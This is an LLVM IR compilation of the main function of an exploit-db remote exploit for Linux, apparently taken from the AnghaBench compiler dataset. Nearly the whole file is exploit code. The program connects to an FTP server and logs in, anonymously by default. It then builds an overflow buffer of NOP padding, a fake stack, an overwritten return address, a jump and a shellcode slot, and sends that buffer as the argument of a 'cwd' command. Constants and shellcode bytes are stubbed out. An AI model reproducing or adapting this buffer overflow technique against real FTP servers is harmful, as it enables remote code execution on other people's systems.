; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19218.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19218.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32, i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@BUFSIZE = common dso_local global i32 0, align 4
@MAXUSER = common dso_local global i32 0, align 4
@MAXPASS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"usage\0A %s HostName {[username] [password]}\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"hoge@hohoho.com\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@FTP_PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@exploit_code = common dso_local global i32 0, align 4
@cmdbuf = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@FAKESTACK = common dso_local global i32 0, align 4
@FSTACKOFS = common dso_local global i32 0, align 4
@EIP = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@JMPS = common dso_local global i8 0, align 1
@JMPOFS = common dso_local global i8 0, align 1
@CODEOFS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [10 x i8] c"user %s\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"pass %s\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"cwd %s\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = load i32, i32* @BUFSIZE, align 4
  %20 = add nsw i32 %19, 3000
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %8, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %9, align 8
  %24 = load i32, i32* @BUFSIZE, align 4
  %25 = zext i32 %24 to i64
  %26 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %10, align 8
  %27 = load i32, i32* @MAXUSER, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i8, i64 %28, align 16
  store i64 %28, i64* %11, align 8
  %30 = load i32, i32* @MAXPASS, align 4
  %31 = zext i32 %30 to i64
  %32 = alloca i8, i64 %31, align 16
  store i64 %31, i64* %12, align 8
  %33 = load i32, i32* %4, align 4
  %34 = icmp slt i32 %33, 2
  br i1 %34, label %35, label %41

35:                                               ; preds = %2
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0), i8* %38)
  %40 = call i32 @exit(i32 1) #4
  unreachable

41:                                               ; preds = %2
  %42 = load i32, i32* %4, align 4
  %43 = icmp eq i32 %42, 4
  br i1 %43, label %44, label %65

44:                                               ; preds = %41
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = load i32, i32* @MAXUSER, align 4
  %49 = sub nsw i32 %48, 1
  %50 = call i32 @strncpy(i8* %29, i8* %47, i32 %49)
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 3
  %53 = load i8*, i8** %52, align 8
  %54 = load i32, i32* @MAXPASS, align 4
  %55 = sub nsw i32 %54, 1
  %56 = call i32 @strncpy(i8* %32, i8* %53, i32 %55)
  %57 = load i32, i32* @MAXUSER, align 4
  %58 = sub nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %29, i64 %59
  store i8 0, i8* %60, align 1
  %61 = load i32, i32* @MAXPASS, align 4
  %62 = sub nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %32, i64 %63
  store i8 0, i8* %64, align 1
  br label %68

65:                                               ; preds = %41
  %66 = call i32 @strcpy(i8* %29, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  %67 = call i32 @strcpy(i8* %32, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  br label %68

68:                                               ; preds = %65, %44
  br label %69

69:                                               ; preds = %68
  %70 = call i32 @bzero(%struct.sockaddr_in* %7, i32 12)
  %71 = load i32, i32* @AF_INET, align 4
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %71, i32* %72, align 4
  %73 = load i32, i32* @FTP_PORT, align 4
  %74 = call i32 @htons(i32 %73)
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %74, i32* %75, align 4
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @inet_addr(i8* %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %80, i32 0, i32 0
  store i32 %79, i32* %81, align 4
  %82 = icmp eq i32 %79, -1
  br i1 %82, label %83, label %107

83:                                               ; preds = %69
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call %struct.hostent* @gethostbyname(i8* %86)
  store %struct.hostent* %87, %struct.hostent** %6, align 8
  %88 = icmp eq %struct.hostent* %87, null
  br i1 %88, label %89, label %92

89:                                               ; preds = %83
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %91 = call i32 @exit(i32 1) #4
  unreachable

92:                                               ; preds = %83
  %93 = load %struct.hostent*, %struct.hostent** %6, align 8
  %94 = getelementptr inbounds %struct.hostent, %struct.hostent* %93, i32 0, i32 2
  %95 = load i32, i32* %94, align 4
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %95, i32* %96, align 4
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %98 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %97, i32 0, i32 0
  %99 = bitcast i32* %98 to i8*
  %100 = load %struct.hostent*, %struct.hostent** %6, align 8
  %101 = getelementptr inbounds %struct.hostent, %struct.hostent* %100, i32 0, i32 1
  %102 = load i32, i32* %101, align 4
  %103 = load %struct.hostent*, %struct.hostent** %6, align 8
  %104 = getelementptr inbounds %struct.hostent, %struct.hostent* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @memcpy(i8* %99, i32 %102, i32 %105)
  br label %107

107:                                              ; preds = %92, %69
  %108 = load i32, i32* @AF_INET, align 4
  %109 = load i32, i32* @SOCK_STREAM, align 4
  %110 = call i32 @socket(i32 %108, i32 %109, i32 0)
  store i32 %110, i32* %13, align 4
  %111 = icmp slt i32 %110, 0
  br i1 %111, label %112, label %115

112:                                              ; preds = %107
  %113 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %114 = call i32 @exit(i32 0) #4
  unreachable

115:                                              ; preds = %107
  %116 = load i32, i32* %13, align 4
  %117 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %118 = call i64 @connect(i32 %116, %struct.sockaddr* %117, i32 12)
  %119 = icmp slt i64 %118, 0
  br i1 %119, label %120, label %123

120:                                              ; preds = %115
  %121 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %122 = call i32 @exit(i32 0) #4
  unreachable

123:                                              ; preds = %115
  br label %124

124:                                              ; preds = %136, %123
  %125 = load i32, i32* %13, align 4
  %126 = trunc i64 %21 to i32
  %127 = call i32 @read(i32 %125, i8* %23, i32 %126)
  store i32 %127, i32* %14, align 4
  %128 = icmp sgt i32 %127, 0
  br i1 %128, label %129, label %137

129:                                              ; preds = %124
  %130 = load i32, i32* %14, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %23, i64 %131
  store i8 0, i8* %132, align 1
  %133 = call i32* @strchr(i8* %23, i8 signext 10)
  %134 = icmp ne i32* %133, null
  br i1 %134, label %135, label %136

135:                                              ; preds = %129
  br label %137

136:                                              ; preds = %129
  br label %124

137:                                              ; preds = %135, %124
  %138 = load i32, i32* @exploit_code, align 4
  %139 = load i32, i32* @cmdbuf, align 4
  %140 = call i32 @strcat(i32 %138, i32 %139)
  %141 = load i32, i32* @NOP, align 4
  %142 = load i32, i32* @BUFSIZE, align 4
  %143 = call i32 @memset(i8* %26, i32 %141, i32 %142)
  %144 = load i32, i32* @FAKESTACK, align 4
  store i32 %144, i32* %15, align 4
  store i32 0, i32* %14, align 4
  br label %145

145:                                              ; preds = %180, %137
  %146 = load i32, i32* %14, align 4
  %147 = load i32, i32* @FSTACKOFS, align 4
  %148 = icmp slt i32 %146, %147
  br i1 %148, label %149, label %183

149:                                              ; preds = %145
  %150 = load i32, i32* %15, align 4
  %151 = and i32 %150, 255
  %152 = trunc i32 %151 to i8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %26, i64 %154
  store i8 %152, i8* %155, align 1
  %156 = load i32, i32* %15, align 4
  %157 = ashr i32 %156, 8
  %158 = and i32 %157, 255
  %159 = trunc i32 %158 to i8
  %160 = load i32, i32* %14, align 4
  %161 = add nsw i32 %160, 1
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %26, i64 %162
  store i8 %159, i8* %163, align 1
  %164 = load i32, i32* %15, align 4
  %165 = ashr i32 %164, 16
  %166 = and i32 %165, 255
  %167 = trunc i32 %166 to i8
  %168 = load i32, i32* %14, align 4
  %169 = add nsw i32 %168, 2
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %26, i64 %170
  store i8 %167, i8* %171, align 1
  %172 = load i32, i32* %15, align 4
  %173 = ashr i32 %172, 24
  %174 = and i32 %173, 255
  %175 = trunc i32 %174 to i8
  %176 = load i32, i32* %14, align 4
  %177 = add nsw i32 %176, 3
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8, i8* %26, i64 %178
  store i8 %175, i8* %179, align 1
  br label %180

180:                                              ; preds = %149
  %181 = load i32, i32* %14, align 4
  %182 = add nsw i32 %181, 4
  store i32 %182, i32* %14, align 4
  br label %145

183:                                              ; preds = %145
  %184 = load i32, i32* @EIP, align 4
  store i32 %184, i32* %16, align 4
  %185 = load i32, i32* %16, align 4
  %186 = and i32 %185, 255
  %187 = trunc i32 %186 to i8
  %188 = load i64, i64* @RETADR, align 8
  %189 = getelementptr inbounds i8, i8* %26, i64 %188
  store i8 %187, i8* %189, align 1
  %190 = load i32, i32* %16, align 4
  %191 = ashr i32 %190, 8
  %192 = and i32 %191, 255
  %193 = trunc i32 %192 to i8
  %194 = load i64, i64* @RETADR, align 8
  %195 = add i64 %194, 1
  %196 = getelementptr inbounds i8, i8* %26, i64 %195
  store i8 %193, i8* %196, align 1
  %197 = load i32, i32* %16, align 4
  %198 = ashr i32 %197, 16
  %199 = and i32 %198, 255
  %200 = trunc i32 %199 to i8
  %201 = load i64, i64* @RETADR, align 8
  %202 = add i64 %201, 2
  %203 = getelementptr inbounds i8, i8* %26, i64 %202
  store i8 %200, i8* %203, align 1
  %204 = load i32, i32* %16, align 4
  %205 = ashr i32 %204, 24
  %206 = and i32 %205, 255
  %207 = trunc i32 %206 to i8
  %208 = load i64, i64* @RETADR, align 8
  %209 = add i64 %208, 3
  %210 = getelementptr inbounds i8, i8* %26, i64 %209
  store i8 %207, i8* %210, align 1
  %211 = load i8, i8* @JMPS, align 1
  %212 = load i64, i64* @RETADR, align 8
  %213 = add i64 %212, 4
  %214 = getelementptr inbounds i8, i8* %26, i64 %213
  store i8 %211, i8* %214, align 1
  %215 = load i8, i8* @JMPOFS, align 1
  %216 = load i64, i64* @RETADR, align 8
  %217 = add i64 %216, 5
  %218 = getelementptr inbounds i8, i8* %26, i64 %217
  store i8 %215, i8* %218, align 1
  %219 = load i32, i32* @CODEOFS, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %26, i64 %220
  %222 = load i32, i32* @exploit_code, align 4
  %223 = load i32, i32* @exploit_code, align 4
  %224 = call i32 @strlen(i32 %223)
  %225 = call i32 @memcpy(i8* %221, i32 %222, i32 %224)
  %226 = load i32, i32* @BUFSIZE, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds i8, i8* %26, i64 %227
  store i8 0, i8* %228, align 1
  %229 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i8* %29)
  %230 = load i32, i32* %13, align 4
  %231 = call i32 @sendcmd(i32 %230, i8* %23)
  %232 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0), i8* %32)
  %233 = load i32, i32* %13, align 4
  %234 = call i32 @sendcmd(i32 %233, i8* %23)
  %235 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0), i8* %26)
  %236 = load i32, i32* %13, align 4
  %237 = call i32 @sendcmd(i32 %236, i8* %23)
  %238 = load i32, i32* %13, align 4
  %239 = call i32 @close(i32 %238)
  %240 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %240)
  %241 = load i32, i32* %3, align 4
  ret i32 %241
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32* @strchr(i8*, i8 signext) #2

declare dso_local i32 @strcat(i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @sendcmd(i32, i8*) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
